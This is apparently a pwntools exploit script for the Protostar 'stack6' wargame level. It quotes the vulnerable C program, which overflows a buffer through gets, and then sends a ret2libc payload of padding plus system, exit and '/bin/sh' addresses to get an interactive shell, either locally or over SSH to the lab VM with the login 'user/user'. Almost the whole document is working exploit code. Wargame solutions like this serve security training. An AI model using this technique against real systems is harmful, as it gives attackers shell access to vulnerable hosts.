'''
Source:
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{

  getpath();

}
'''

from pwn import *
import os,sys

BINPATH = '/opt/protostar/bin/stack6'

def getFile():

    s = ssh(host='protostar',\
            user='user',\
            password='user')

    # Retieve the file
    f = open('stack6', 'wb')
    f.write(s.download_data(BINPATH))
    f.close()
    os.chmod('stack5', stat.S_IRWXU)

    '''
    f = open('libc.so', 'wb')
    f.write(s.download_data(LIBCPATH))
    f.close()
    '''

# getFile()

# ret2libc
# https://spz.io/2018/10/18/buffer-overflow-return-to-libc/

if args.REMOTE:
    libc = 0xb7e99000                  # ldd stack6
    system = p32(libc + 0x00038fb0)    # readelf -s /lib/libc.so.6 | grep system
    exit = p32(libc + 0x0002f0c0)      # readelf -s /lib/libc.so.6 | grep exit
    binsh = p32(libc + 0x0011f3bf)     # strings -a -t x /lib/libc.so.6 | grep /bin/sh

    s = ssh(host='protostar',\
            user='user',\
            password='user')

    p = s.run(BINPATH)

else:

    p = process('./stack6')
    #gdb.attach(p)

    system = p32(0xf7e0c030)        # p system
    binsh = p32(0xf7f5333c)         # searchmem /bin/sh
    exit = p32(0xf7dd9562)          # searchmem exit

p.sendline(b'A' * 80 + system + exit + binsh)
p.interactive()
